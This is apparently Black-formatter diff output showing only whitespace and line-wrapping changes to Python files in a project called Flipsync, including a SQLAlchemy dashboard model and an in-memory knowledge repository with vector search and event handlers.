     total_count: int = Field(..., description="Total number of metrics")
     time_range: TimePeriod = Field(..., description="Time range for the metrics")
     created_at: datetime = Field(..., description="Collection creation timestamp")
 
 
 class AnalyticsHealthCheck(BaseModel):
     """Model for analytics service health check."""
+
     status: str = Field(..., description="Service status")
     service: str = Field(..., description="Service name")
     metrics_count: int = Field(..., description="Number of available metrics")
     timestamp: str = Field(..., description="Health check timestamp")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/analytics.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/dashboards.py	2025-06-16 19:06:35.563949+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/dashboards.py	2025-06-19 04:03:53.410371+00:00
@@ -2,11 +2,21 @@
 
 import uuid
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional
 
-from sqlalchemy import Column, DateTime, String, Text, Boolean, Integer, Float, ForeignKey, JSON
+from sqlalchemy import (
+    Column,
+    DateTime,
+    String,
+    Text,
+    Boolean,
+    Integer,
+    Float,
+    ForeignKey,
+    JSON,
+)
 from sqlalchemy.dialects.postgresql import UUID
 from sqlalchemy.orm import relationship
 
 from fs_agt_clean.core.models.database.base import Base
 
@@ -18,14 +28,18 @@
 
     id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
     name = Column(String(255), nullable=False)
     description = Column(Text)
     type = Column(String(50), nullable=False, default="standard")
-    user_id = Column(Integer, ForeignKey("users.id"), nullable=True)  # Fixed: Integer with ForeignKey
+    user_id = Column(
+        Integer, ForeignKey("users.id"), nullable=True
+    )  # Fixed: Integer with ForeignKey
     config = Column(JSON, nullable=False, default={})
     is_public = Column(Boolean, default=False)
-    created_at = Column(DateTime, nullable=False, default=lambda: datetime.now(timezone.utc))
+    created_at = Column(
+        DateTime, nullable=False, default=lambda: datetime.now(timezone.utc)
+    )
     updated_at = Column(
         DateTime, nullable=False, default=lambda: datetime.now(timezone.utc)
     )
 
     # Relationship back to User model
@@ -122,8 +136,8 @@
             self.user_id = data["user_id"]
         if "config" in data:
             self.config = data["config"]
         if "is_public" in data:
             self.is_public = data["is_public"]
-        
+
         # Always update the timestamp
         self.updated_at = datetime.now(timezone.utc)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/dashboards.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/in_memory_knowledge_repository.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/in_memory_knowledge_repository.py	2025-06-19 04:03:53.384292+00:00
@@ -11,40 +11,64 @@
 
 import numpy as np
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventNameFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventNameFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError, KnowledgeRepository
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
+    KnowledgeRepository,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.vector_storage import (
-    VectorStorage, VectorStorageError, InMemoryVectorStorage
+    VectorStorage,
+    VectorStorageError,
+    InMemoryVectorStorage,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.embedding_provider import (
-    EmbeddingProvider, EmbeddingError, SimpleEmbeddingProvider
+    EmbeddingProvider,
+    EmbeddingError,
+    SimpleEmbeddingProvider,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_publisher import (
-    KnowledgePublisher, PublishError
+    KnowledgePublisher,
+    PublishError,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_subscriber import (
-    KnowledgeSubscriber, SubscriptionFilter, KnowledgeHandler
+    KnowledgeSubscriber,
+    SubscriptionFilter,
+    KnowledgeHandler,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_validator import (
-    KnowledgeValidator, ValidationError, SchemaValidator
+    KnowledgeValidator,
+    ValidationError,
+    SchemaValidator,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_retriever import (
-    KnowledgeRetriever, QueryResult, SimilaritySearch, MetadataFilter
+    KnowledgeRetriever,
+    QueryResult,
+    SimilaritySearch,
+    MetadataFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_cache import (
-    KnowledgeCache, CacheStrategy, LRUCache
+    KnowledgeCache,
+    CacheStrategy,
+    LRUCache,
 )
 
 
-class InMemoryKnowledgeRepository(KnowledgeRepository, KnowledgePublisher, KnowledgeSubscriber, KnowledgeRetriever):
+class InMemoryKnowledgeRepository(
+    KnowledgeRepository, KnowledgePublisher, KnowledgeSubscriber, KnowledgeRetriever
+):
     """
     In-memory implementation of the Knowledge Repository.
 
     This implementation stores knowledge items in memory, providing
     efficient access and vector-based search capabilities.
@@ -54,11 +78,11 @@
         self,
         repository_id: str,
         vector_storage: Optional[VectorStorage] = None,
         embedding_provider: Optional[EmbeddingProvider] = None,
         validator: Optional[KnowledgeValidator] = None,
-        cache: Optional[KnowledgeCache] = None
+        cache: Optional[KnowledgeCache] = None,
     ):
         """
         Initialize an in-memory knowledge repository.
 
         Args:
@@ -70,17 +94,27 @@
         """
         self.repository_id = repository_id
         self.logger = get_logger(f"knowledge_repository.{repository_id}")
 
         # Create publisher and subscriber for event-based communication
-        self.publisher = create_publisher(source_id=f"knowledge_repository.{repository_id}")
-        self.subscriber = create_subscriber(subscriber_id=f"knowledge_repository.{repository_id}")
+        self.publisher = create_publisher(
+            source_id=f"knowledge_repository.{repository_id}"
+        )
+        self.subscriber = create_subscriber(
+            subscriber_id=f"knowledge_repository.{repository_id}"
+        )
 
         # Create or use provided components
-        self.vector_storage = vector_storage or InMemoryVectorStorage(storage_id=f"{repository_id}.storage")
-        self.embedding_provider = embedding_provider or SimpleEmbeddingProvider(provider_id=f"{repository_id}.embeddings")
-        self.validator = validator or SchemaValidator(validator_id=f"{repository_id}.validator")
+        self.vector_storage = vector_storage or InMemoryVectorStorage(
+            storage_id=f"{repository_id}.storage"
+        )
+        self.embedding_provider = embedding_provider or SimpleEmbeddingProvider(
+            provider_id=f"{repository_id}.embeddings"
+        )
+        self.validator = validator or SchemaValidator(
+            validator_id=f"{repository_id}.validator"
+        )
         self.cache = cache or LRUCache(cache_id=f"{repository_id}.cache")
 
         # Initialize storage
         self.knowledge_items: Dict[str, KnowledgeItem] = {}
         self.version_history: Dict[str, List[str]] = {}
@@ -136,32 +170,34 @@
         try:
             # Check if the knowledge item already exists
             if knowledge.knowledge_id in self.knowledge_items:
                 raise KnowledgeError(
                     f"Knowledge item already exists: {knowledge.knowledge_id}",
-                    knowledge_id=knowledge.knowledge_id
+                    knowledge_id=knowledge.knowledge_id,
                 )
 
             # Validate the knowledge item
             try:
                 await self.validator.validate(knowledge)
             except ValidationError as e:
                 raise KnowledgeError(
                     f"Knowledge item validation failed: {str(e)}",
                     knowledge_id=knowledge.knowledge_id,
-                    cause=e
+                    cause=e,
                 )
 
             # Generate an embedding if not provided
             if knowledge.vector is None:
                 try:
-                    knowledge.vector = await self.embedding_provider.get_embedding(knowledge.content)
+                    knowledge.vector = await self.embedding_provider.get_embedding(
+                        knowledge.content
+                    )
                 except EmbeddingError as e:
                     raise KnowledgeError(
                         f"Failed to generate embedding: {str(e)}",
                         knowledge_id=knowledge.knowledge_id,
-                        cause=e
+                        cause=e,
                     )
 
             # Add the vector to the vector storage
             try:
                 await self.vector_storage.add_vector(
@@ -169,18 +205,18 @@
                     vector=knowledge.vector,
                     metadata={
                         "topic": knowledge.topic,
                         "type": knowledge.knowledge_type.name,
                         "source_id": knowledge.source_id,
-                        "tags": list(knowledge.tags)
-                    }
+                        "tags": list(knowledge.tags),
+                    },
                 )
             except VectorStorageError as e:
                 raise KnowledgeError(
                     f"Failed to add vector: {str(e)}",
                     knowledge_id=knowledge.knowledge_id,
-                    cause=e
+                    cause=e,
                 )
 
             # Store the knowledge item
             self.knowledge_items[knowledge.knowledge_id] = knowledge
 
@@ -189,31 +225,37 @@
 
             # Add to version history
             if knowledge.previous_version_id:
                 if knowledge.previous_version_id not in self.version_history:
                     self.version_history[knowledge.previous_version_id] = []
-                self.version_history[knowledge.previous_version_id].append(knowledge.knowledge_id)
+                self.version_history[knowledge.previous_version_id].append(
+                    knowledge.knowledge_id
+                )
 
             # Add to cache
             await self.cache.add(knowledge)
 
             # Notify subscribers
             await self._notify_subscribers(knowledge)
 
             # Publish event
             await self._publish_knowledge_added_event(knowledge)
 
-            self.logger.info(f"Added knowledge item: {knowledge.knowledge_id} ({knowledge.topic})")
+            self.logger.info(
+                f"Added knowledge item: {knowledge.knowledge_id} ({knowledge.topic})"
+            )
 
             return knowledge.knowledge_id
         except KnowledgeError:
             # Re-raise knowledge errors
             raise
         except Exception as e:
             error_msg = f"Failed to add knowledge item: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
-            raise KnowledgeError(error_msg, knowledge_id=knowledge.knowledge_id, cause=e)
+            raise KnowledgeError(
+                error_msg, knowledge_id=knowledge.knowledge_id, cause=e
+            )
 
     async def update_knowledge(self, knowledge: KnowledgeItem) -> str:
         """
         Update a knowledge item in the repository.
 
@@ -229,32 +271,34 @@
         try:
             # Check if the knowledge item exists
             if knowledge.previous_version_id not in self.knowledge_items:
                 raise KnowledgeError(
                     f"Knowledge item not found: {knowledge.previous_version_id}",
-                    knowledge_id=knowledge.previous_version_id
+                    knowledge_id=knowledge.previous_version_id,
                 )
 
             # Validate the knowledge item
             try:
                 await self.validator.validate(knowledge)
             except ValidationError as e:
                 raise KnowledgeError(
                     f"Knowledge item validation failed: {str(e)}",
                     knowledge_id=knowledge.knowledge_id,
-                    cause=e
+                    cause=e,
                 )
 
             # Generate an embedding if not provided
             if knowledge.vector is None:
                 try:
-                    knowledge.vector = await self.embedding_provider.get_embedding(knowledge.content)
+                    knowledge.vector = await self.embedding_provider.get_embedding(
+                        knowledge.content
+                    )
                 except EmbeddingError as e:
                     raise KnowledgeError(
                         f"Failed to generate embedding: {str(e)}",
                         knowledge_id=knowledge.knowledge_id,
-                        cause=e
+                        cause=e,
                     )
 
             # Add the vector to the vector storage
             try:
                 await self.vector_storage.add_vector(
@@ -262,18 +306,18 @@
                     vector=knowledge.vector,
                     metadata={
                         "topic": knowledge.topic,
                         "type": knowledge.knowledge_type.name,
                         "source_id": knowledge.source_id,
-                        "tags": list(knowledge.tags)
-                    }
+                        "tags": list(knowledge.tags),
+                    },
                 )
             except VectorStorageError as e:
                 raise KnowledgeError(
                     f"Failed to add vector: {str(e)}",
                     knowledge_id=knowledge.knowledge_id,
-                    cause=e
+                    cause=e,
                 )
 
             # Store the knowledge item
             self.knowledge_items[knowledge.knowledge_id] = knowledge
 
@@ -281,31 +325,37 @@
             self._update_indexes(knowledge)
 
             # Add to version history
             if knowledge.previous_version_id not in self.version_history:
                 self.version_history[knowledge.previous_version_id] = []
-            self.version_history[knowledge.previous_version_id].append(knowledge.knowledge_id)
+            self.version_history[knowledge.previous_version_id].append(
+                knowledge.knowledge_id
+            )
 
             # Add to cache
             await self.cache.add(knowledge)
 
             # Notify subscribers
             await self._notify_subscribers(knowledge)
 
             # Publish event
             await self._publish_knowledge_updated_event(knowledge)
 
-            self.logger.info(f"Updated knowledge item: {knowledge.knowledge_id} ({knowledge.topic})")
+            self.logger.info(
+                f"Updated knowledge item: {knowledge.knowledge_id} ({knowledge.topic})"
+            )
 
             return knowledge.knowledge_id
         except KnowledgeError:
             # Re-raise knowledge errors
             raise
         except Exception as e:
             error_msg = f"Failed to update knowledge item: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
-            raise KnowledgeError(error_msg, knowledge_id=knowledge.knowledge_id, cause=e)
+            raise KnowledgeError(
+                error_msg, knowledge_id=knowledge.knowledge_id, cause=e
+            )
 
     async def get_knowledge(self, knowledge_id: str) -> Optional[KnowledgeItem]:
         """
         Get a knowledge item by ID.
 
@@ -361,11 +411,13 @@
 
             # Remove from vector storage
             try:
                 await self.vector_storage.delete_vector(knowledge_id)
             except VectorStorageError as e:
-                self.logger.warning(f"Failed to delete vector for {knowledge_id}: {str(e)}")
+                self.logger.warning(
+                    f"Failed to delete vector for {knowledge_id}: {str(e)}"
+                )
 
             # Remove from indexes
             self._remove_from_indexes(knowledge)
 
             # Remove from cache
@@ -417,11 +469,13 @@
         except Exception as e:
             error_msg = f"Failed to get knowledge items by topic {topic}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, cause=e)
 
-    async def get_knowledge_by_type(self, knowledge_type: KnowledgeType) -> List[KnowledgeItem]:
+    async def get_knowledge_by_type(
+        self, knowledge_type: KnowledgeType
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items by type.
 
         Args:
             knowledge_type: Type to search for
@@ -450,11 +504,13 @@
                     # Add to cache
                     await self.cache.add(knowledge)
 
             return items
         except Exception as e:
-            error_msg = f"Failed to get knowledge items by type {knowledge_type.name}: {str(e)}"
+            error_msg = (
+                f"Failed to get knowledge items by type {knowledge_type.name}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, cause=e)
 
     async def get_knowledge_by_source(self, source_id: str) -> List[KnowledgeItem]:
         """
@@ -523,11 +579,13 @@
         except Exception as e:
             error_msg = f"Failed to get knowledge items by tag {tag}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, cause=e)
 
-    async def get_knowledge_by_status(self, status: KnowledgeStatus) -> List[KnowledgeItem]:
+    async def get_knowledge_by_status(
+        self, status: KnowledgeStatus
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items by status.
 
         Args:
             status: Status to search for
@@ -556,15 +614,19 @@
                     # Add to cache
                     await self.cache.add(knowledge)
 
             return items
         except Exception as e:
-            error_msg = f"Failed to get knowledge items by status {status.name}: {str(e)}"
+            error_msg = (
+                f"Failed to get knowledge items by status {status.name}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, cause=e)
 
-    async def search_knowledge(self, query: str, limit: int = 10) -> List[Tuple[KnowledgeItem, float]]:
+    async def search_knowledge(
+        self, query: str, limit: int = 10
+    ) -> List[Tuple[KnowledgeItem, float]]:
         """
         Search for knowledge items by similarity to a query.
 
         Args:
             query: Query string
@@ -580,22 +642,20 @@
             # Generate an embedding for the query
             try:
                 query_vector = await self.embedding_provider.get_embedding(query)
             except EmbeddingError as e:
                 raise KnowledgeError(
-                    f"Failed to generate embedding for query: {str(e)}",
-                    cause=e
+                    f"Failed to generate embedding for query: {str(e)}", cause=e
                 )
 
             # Search by vector
             try:
-                results = await self.vector_storage.search_by_vector(query_vector, limit)
+                results = await self.vector_storage.search_by_vector(
+                    query_vector, limit
+                )
             except VectorStorageError as e:
-                raise KnowledgeError(
-                    f"Failed to search by vector: {str(e)}",
-                    cause=e
-                )
+                raise KnowledgeError(f"Failed to search by vector: {str(e)}", cause=e)
 
             # Get knowledge items
             items = []
             for knowledge_id, score in results:
                 knowledge = self.knowledge_items.get(knowledge_id)
@@ -609,11 +669,13 @@
         except Exception as e:
             error_msg = f"Failed to search knowledge: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, cause=e)
 
-    async def similar_knowledge(self, knowledge_id: str, limit: int = 10) -> List[Tuple[KnowledgeItem, float]]:
+    async def similar_knowledge(
+        self, knowledge_id: str, limit: int = 10
+    ) -> List[Tuple[KnowledgeItem, float]]:
         """
         Find knowledge items similar to a given knowledge item.
 
         Args:
             knowledge_id: ID of the knowledge item
@@ -629,21 +691,21 @@
             # Check if the knowledge item exists
             knowledge = await self.get_knowledge(knowledge_id)
             if not knowledge:
                 raise KnowledgeError(
                     f"Knowledge item not found: {knowledge_id}",
-                    knowledge_id=knowledge_id
+                    knowledge_id=knowledge_id,
                 )
 
             # Search by vector
             try:
                 results = await self.vector_storage.search_by_id(knowledge_id, limit)
             except VectorStorageError as e:
                 raise KnowledgeError(
                     f"Failed to search by ID: {str(e)}",
                     knowledge_id=knowledge_id,
-                    cause=e
+                    cause=e,
                 )
 
             # Get knowledge items
             items = []
             for similar_id, score in results:
@@ -658,11 +720,13 @@
         except Exception as e:
             error_msg = f"Failed to find similar knowledge for {knowledge_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, knowledge_id=knowledge_id, cause=e)
 
-    async def get_knowledge_version_history(self, knowledge_id: str) -> List[KnowledgeItem]:
+    async def get_knowledge_version_history(
+        self, knowledge_id: str
+    ) -> List[KnowledgeItem]:
         """
         Get the version history of a knowledge item.
 
         Args:
             knowledge_id: ID of the knowledge item
@@ -677,11 +741,11 @@
             # Check if the knowledge item exists
             knowledge = await self.get_knowledge(knowledge_id)
             if not knowledge:
                 raise KnowledgeError(
                     f"Knowledge item not found: {knowledge_id}",
-                    knowledge_id=knowledge_id
+                    knowledge_id=knowledge_id,
                 )
 
             # Get version history
             history = [knowledge]
 
@@ -740,11 +804,11 @@
         topic: str,
         content: Any,
         metadata: Optional[Dict[str, Any]] = None,
         source_id: Optional[str] = None,
         access_control: Optional[Dict[str, Any]] = None,
-        tags: Optional[Set[str]] = None
+        tags: Optional[Set[str]] = None,
     ) -> str:
         """
         Publish a knowledge item to the repository.
 
         Args:
@@ -769,22 +833,22 @@
                 topic=topic,
                 content=content,
                 metadata=metadata,
                 source_id=source_id,
                 access_control=access_control,
-                tags=tags
+                tags=tags,
             )
 
             # Add the knowledge item to the repository
             try:
                 knowledge_id = await self.add_knowledge(knowledge)
                 return knowledge_id
             except KnowledgeError as e:
                 raise PublishError(
                     f"Failed to add knowledge item: {str(e)}",
                     knowledge_id=knowledge.knowledge_id,
-                    cause=e
+                    cause=e,
                 )
         except PublishError:
             # Re-raise publish errors
             raise
         except Exception as e:
@@ -796,11 +860,11 @@
         self,
         knowledge_id: str,
         content: Optional[Any] = None,
         metadata: Optional[Dict[str, Any]] = None,
         status: Optional[KnowledgeStatus] = None,
-        tags: Optional[Set[str]] = None
+        tags: Optional[Set[str]] = None,
     ) -> str:
         """
         Update a knowledge item in the repository by ID.
 
         Args:
@@ -820,30 +884,27 @@
             # Get the knowledge item
             knowledge = await self.get_knowledge(knowledge_id)
             if not knowledge:
                 raise PublishError(
                     f"Knowledge item not found: {knowledge_id}",
-                    knowledge_id=knowledge_id
+                    knowledge_id=knowledge_id,
                 )
 
             # Create an updated version
             updated = knowledge.update(
-                content=content,
-                metadata=metadata,
-                status=status,
-                tags=tags
+                content=content, metadata=metadata, status=status, tags=tags
             )
 
             # Add the updated knowledge item to the repository
             try:
                 updated_id = await self.add_knowledge(updated)
                 return updated_id
             except KnowledgeError as e:
                 raise PublishError(
                     f"Failed to update knowledge item: {str(e)}",
                     knowledge_id=updated.knowledge_id,
-                    cause=e
+                    cause=e,
                 )
         except PublishError:
             # Re-raise publish errors
             raise
         except Exception as e:
@@ -877,11 +938,13 @@
 
                 # Remove from vector storage
                 try:
                     await self.vector_storage.delete_vector(knowledge_id)
                 except VectorStorageError as e:
-                    self.logger.warning(f"Failed to delete vector for {knowledge_id}: {str(e)}")
+                    self.logger.warning(
+                        f"Failed to delete vector for {knowledge_id}: {str(e)}"
+                    )
 
                 # Remove from indexes
                 self._remove_from_indexes(knowledge)
 
                 # Remove from cache
@@ -895,24 +958,21 @@
                 return True
             except KnowledgeError as e:
                 raise PublishError(
                     f"Failed to delete knowledge item: {str(e)}",
                     knowledge_id=knowledge_id,
-                    cause=e
+                    cause=e,
                 )
         except PublishError:
             # Re-raise publish errors
             raise
         except Exception as e:
             error_msg = f"Failed to delete knowledge item {knowledge_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise PublishError(error_msg, knowledge_id=knowledge_id, cause=e)
 
-    async def publish_batch(
-        self,
-        items: List[Dict[str, Any]]
-    ) -> List[str]:
+    async def publish_batch(self, items: List[Dict[str, Any]]) -> List[str]:
         """
         Publish multiple knowledge items to the repository.
 
         Args:
             items: List of knowledge items to publish
@@ -933,11 +993,11 @@
                         topic=item.get("topic"),
                         content=item.get("content"),
                         metadata=item.get("metadata"),
                         source_id=item.get("source_id"),
                         access_control=item.get("access_control"),
-                        tags=item.get("tags")
+                        tags=item.get("tags"),
                     )
                     knowledge_ids.append(knowledge_id)
                 except PublishError as e:
                     self.logger.warning(f"Failed to publish item: {str(e)}")
                     knowledge_ids.append(None)
@@ -949,13 +1009,11 @@
             raise PublishError(error_msg, cause=e)
 
     # KnowledgeSubscriber methods
 
     async def subscribe(
-        self,
-        filter: Optional[SubscriptionFilter],
-        handler: KnowledgeHandler
+        self, filter: Optional[SubscriptionFilter], handler: KnowledgeHandler
     ) -> str:
         """
         Subscribe to knowledge updates.
 
         Args:
@@ -1003,11 +1061,11 @@
         """
         # Return subscription information
         return [
             {
                 "subscription_id": subscription_id,
-                "filter": filter.__class__.__name__ if filter else None
+                "filter": filter.__class__.__name__ if filter else None,
             }
             for subscription_id, (filter, _) in self.subscriptions.items()
         ]
 
     # KnowledgeRetriever methods
@@ -1073,11 +1131,13 @@
         except Exception as e:
             error_msg = f"Failed to get knowledge items by topic {topic}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             return []
 
-    async def get_knowledge_by_type(self, knowledge_type: KnowledgeType) -> List[KnowledgeItem]:
+    async def get_knowledge_by_type(
+        self, knowledge_type: KnowledgeType
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items by type.
 
         Args:
             knowledge_type: Type to search for
@@ -1103,11 +1163,13 @@
                     # Add to cache
                     await self.cache.add(knowledge)
 
             return items
         except Exception as e:
-            error_msg = f"Failed to get knowledge items by type {knowledge_type.name}: {str(e)}"
+            error_msg = (
+                f"Failed to get knowledge items by type {knowledge_type.name}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             return []
 
     async def get_knowledge_by_source(self, source_id: str) -> List[KnowledgeItem]:
         """
@@ -1191,11 +1253,13 @@
                 self.logger.error(f"Failed to generate embedding for query: {str(e)}")
                 return []
 
             # Search by vector
             try:
-                results = await self.vector_storage.search_by_vector(query_vector, limit)
+                results = await self.vector_storage.search_by_vector(
+                    query_vector, limit
+                )
             except VectorStorageError as e:
                 self.logger.error(f"Failed to search by vector: {str(e)}")
                 return []
 
             # Get knowledge items
@@ -1209,13 +1273,11 @@
         except Exception as e:
             self.logger.error(f"Failed to search knowledge: {str(e)}")
             return []
 
     async def filter_knowledge(
-        self,
-        filter: MetadataFilter,
-        limit: Optional[int] = None
+        self, filter: MetadataFilter, limit: Optional[int] = None
     ) -> List[KnowledgeItem]:
         """
         Filter knowledge items based on metadata.
 
         Args:
@@ -1240,14 +1302,11 @@
         except Exception as e:
             self.logger.error(f"Failed to filter knowledge: {str(e)}")
             return []
 
     async def search_and_filter(
-        self,
-        query: str,
-        filter: MetadataFilter,
-        limit: int = 10
+        self, query: str, filter: MetadataFilter, limit: int = 10
     ) -> List[QueryResult]:
         """
         Search for knowledge items and filter the results.
 
         Args:
@@ -1258,14 +1317,18 @@
         Returns:
             List of query results
         """
         try:
             # Search by similarity
-            search_results = await self.search_knowledge(query, limit * 2)  # Get more results to filter
+            search_results = await self.search_knowledge(
+                query, limit * 2
+            )  # Get more results to filter
 
             # Filter results
-            filtered_results = [result for result in search_results if filter.matches(result.knowledge)]
+            filtered_results = [
+                result for result in search_results if filter.matches(result.knowledge)
+            ]
 
             # Limit results
             return filtered_results[:limit]
         except Exception as e:
             self.logger.error(f"Failed to search and filter knowledge: {str(e)}")
@@ -1367,41 +1430,43 @@
             if filter is None or filter.matches(knowledge):
                 try:
                     # Call the handler
                     await handler(knowledge)
                 except Exception as e:
-                    self.logger.warning(f"Error in subscription handler {subscription_id}: {str(e)}")
+                    self.logger.warning(
+                        f"Error in subscription handler {subscription_id}: {str(e)}"
+                    )
 
     async def _subscribe_to_events(self) -> None:
         """
         Subscribe to knowledge-related events.
         """
         # Subscribe to knowledge query events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"knowledge_query"}),
-            handler=self._handle_knowledge_query
+            handler=self._handle_knowledge_query,
         )
         self.event_subscription_ids.append(subscription_id)
 
         # Subscribe to knowledge publish events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"knowledge_publish"}),
-            handler=self._handle_knowledge_publish
+            handler=self._handle_knowledge_publish,
         )
         self.event_subscription_ids.append(subscription_id)
 
         # Subscribe to knowledge update events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"knowledge_update"}),
-            handler=self._handle_knowledge_update
+            handler=self._handle_knowledge_update,
         )
         self.event_subscription_ids.append(subscription_id)
 
         # Subscribe to knowledge delete events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"knowledge_delete"}),
-            handler=self._handle_knowledge_delete
+            handler=self._handle_knowledge_delete,
         )
         self.event_subscription_ids.append(subscription_id)
 
     async def _handle_knowledge_query(self, event: Event) -> None:
         """
@@ -1449,16 +1514,18 @@
                 notification_name="knowledge_query_response",
                 data={
                     "query": query,
                     "query_type": query_type,
                     "results": results,
-                    "result_count": len(results)
+                    "result_count": len(results),
                 },
-                correlation_id=correlation_id
+                correlation_id=correlation_id,
             )
         except Exception as e:
-            self.logger.error(f"Error handling knowledge query event: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling knowledge query event: {str(e)}", exc_info=True
+            )
 
     async def _handle_knowledge_publish(self, event: Event) -> None:
         """
         Handle a knowledge publish event.
 
@@ -1475,11 +1542,13 @@
             access_control = event.data.get("access_control")
             tags = event.data.get("tags")
             correlation_id = event.correlation_id
 
             if not knowledge_type_str or not topic or content is None:
-                self.logger.warning("Received knowledge publish event with missing data")
+                self.logger.warning(
+                    "Received knowledge publish event with missing data"
+                )
                 return
 
             # Convert knowledge type string to enum
             try:
                 knowledge_type = KnowledgeType[knowledge_type_str]
@@ -1498,34 +1567,30 @@
                     topic=topic,
                     content=content,
                     metadata=metadata,
                     source_id=source_id,
                     access_control=access_control,
-                    tags=tags
+                    tags=tags,
                 )
 
                 # Publish response
                 await self.publisher.publish_notification(
                     notification_name="knowledge_publish_response",
-                    data={
-                        "knowledge_id": knowledge_id,
-                        "success": True
-                    },
-                    correlation_id=correlation_id
+                    data={"knowledge_id": knowledge_id, "success": True},
+                    correlation_id=correlation_id,
                 )
             except PublishError as e:
                 # Publish error response
                 await self.publisher.publish_notification(
                     notification_name="knowledge_publish_response",
-                    data={
-                        "success": False,
-                        "error": str(e)
-                    },
-                    correlation_id=correlation_id
-                )
-        except Exception as e:
-            self.logger.error(f"Error handling knowledge publish event: {str(e)}", exc_info=True)
+                    data={"success": False, "error": str(e)},
+                    correlation_id=correlation_id,
+                )
+        except Exception as e:
+            self.logger.error(
+                f"Error handling knowledge publish event: {str(e)}", exc_info=True
+            )
 
     async def _handle_knowledge_update(self, event: Event) -> None:
         """
         Handle a knowledge update event.
 
@@ -1540,11 +1605,13 @@
             status_str = event.data.get("status")
             tags = event.data.get("tags")
             correlation_id = event.correlation_id
 
             if not knowledge_id:
-                self.logger.warning("Received knowledge update event with missing knowledge_id")
+                self.logger.warning(
+                    "Received knowledge update event with missing knowledge_id"
+                )
                 return
 
             # Convert status string to enum if provided
             status = None
             if status_str:
@@ -1563,36 +1630,38 @@
                 updated_id = await self.update_knowledge_by_id(
                     knowledge_id=knowledge_id,
                     content=content,
                     metadata=metadata,
                     status=status,
-                    tags=tags
+                    tags=tags,
                 )
 
                 # Publish response
                 await self.publisher.publish_notification(
                     notification_name="knowledge_update_response",
                     data={
                         "knowledge_id": knowledge_id,
                         "updated_id": updated_id,
-                        "success": True
+                        "success": True,
                     },
-                    correlation_id=correlation_id
+                    correlation_id=correlation_id,
                 )
             except PublishError as e:
                 # Publish error response
                 await self.publisher.publish_notification(
                     notification_name="knowledge_update_response",
                     data={
                         "knowledge_id": knowledge_id,
                         "success": False,
-                        "error": str(e)
+                        "error": str(e),
                     },
-                    correlation_id=correlation_id
-                )
-        except Exception as e:
-            self.logger.error(f"Error handling knowledge update event: {str(e)}", exc_info=True)
+                    correlation_id=correlation_id,
+                )
+        except Exception as e:
+            self.logger.error(
+                f"Error handling knowledge update event: {str(e)}", exc_info=True
+            )
 
     async def _handle_knowledge_delete(self, event: Event) -> None:
         """
         Handle a knowledge delete event.
 
@@ -1603,39 +1672,40 @@
             # Extract knowledge information
             knowledge_id = event.data.get("knowledge_id")
             correlation_id = event.correlation_id
 
             if not knowledge_id:
-                self.logger.warning("Received knowledge delete event with missing knowledge_id")
+                self.logger.warning(
+                    "Received knowledge delete event with missing knowledge_id"
+                )
                 return
 
             # Delete the knowledge item
             try:
                 deleted = await self.delete_knowledge_by_id(knowledge_id)
 
                 # Publish response
                 await self.publisher.publish_notification(
                     notification_name="knowledge_delete_response",
-                    data={
-                        "knowledge_id": knowledge_id,
-                        "success": deleted
-                    },
-                    correlation_id=correlation_id
+                    data={"knowledge_id": knowledge_id, "success": deleted},
+                    correlation_id=correlation_id,
                 )
             except PublishError as e:
                 # Publish error response
                 await self.publisher.publish_notification(
                     notification_name="knowledge_delete_response",
                     data={
                         "knowledge_id": knowledge_id,
                         "success": False,
-                        "error": str(e)
+                        "error": str(e),
                     },
-                    correlation_id=correlation_id
-                )
-        except Exception as e:
-            self.logger.error(f"Error handling knowledge delete event: {str(e)}", exc_info=True)
+                    correlation_id=correlation_id,
+                )
+        except Exception as e:
+            self.logger.error(
+                f"Error handling knowledge delete event: {str(e)}", exc_info=True
+            )
